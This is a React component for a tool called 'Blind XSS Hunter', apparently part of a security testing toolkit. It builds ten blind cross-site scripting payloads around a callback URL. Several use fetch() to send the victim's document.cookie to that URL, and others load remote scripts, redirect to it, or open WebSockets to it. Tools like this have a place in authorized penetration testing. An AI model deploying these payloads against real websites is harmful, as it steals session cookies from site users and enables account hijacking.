import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import ToolWrapper from './ToolWrapper';
import { ShieldIcon, LoadingIcon } from '../common/Icons';

export default function BlindXSSHunter() {
  const { addToolResult } = useStore();
  const [callbackUrl, setCallbackUrl] = useState('');
  const [results, setResults] = useState<Array<{ payload: string; location: string }>>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const generatePayloads = () => {
    if (!callbackUrl.trim()) {
      setError('Callback URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const payloads: Array<{ payload: string; location: string }> = [
        { location: 'Script Tag', payload: `<script src="${callbackUrl}"></script>` },
        {
          location: 'Image Tag',
          payload: `<img src=x onerror="fetch('${callbackUrl}?c='+document.cookie)">`,
        },
        { location: 'SVG', payload: `<svg onload="fetch('${callbackUrl}?c='+document.cookie)">` },
        {
          location: 'Input Field',
          payload: `" onfocus="fetch('${callbackUrl}?c='+document.cookie)" autofocus="`,
        },
        { location: 'HTML Comment', payload: `--><script src="${callbackUrl}"></script><!--` },
        {
          location: 'Event Handler',
          payload: `javascript:fetch('${callbackUrl}?c='+document.cookie)`,
        },
        {
          location: 'Form Action',
          payload: `"><form action="${callbackUrl}"><input type="submit">`,
        },
        {
          location: 'Meta Refresh',
          payload: `<meta http-equiv="refresh" content="0;url=${callbackUrl}">`,
        },
        { location: 'Link Prefetch', payload: `<link rel="prefetch" href="${callbackUrl}">` },
        {
          location: 'WebSocket',
          payload: `<script>new WebSocket('${callbackUrl.replace('http', 'ws')}')</script>`,
        },
      ];

      setResults(payloads);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'Blind XSS Hunter',
        timestamp: Date.now(),
        input: { callbackUrl },
        output: payloads,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Payload generation failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="Blind XSS Hunter"
      icon={<ShieldIcon />}
      description="Generate Blind XSS payloads for callback detection"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Callback URL</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://your-callback-server.com/xss"
            value={callbackUrl}
            onChange={(e) => setCallbackUrl(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={generatePayloads} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Generating...
              </>
            ) : (
              'Generate Payloads'
            )}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Blind XSS Payloads</span>
          </div>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <span style={{ color: '#00ffaa', fontFamily: 'var(--font-mono)' }}>
                {result.location}
              </span>
              <span
                style={{
                  color: '#666',
                  fontSize: '12px',
                  marginTop: '4px',
                  wordBreak: 'break-all',
                  display: 'block',
                }}
              >
                {result.payload}
              </span>
            </div>
          ))}
        </div>
      )}
    </ToolWrapper>
  );
}
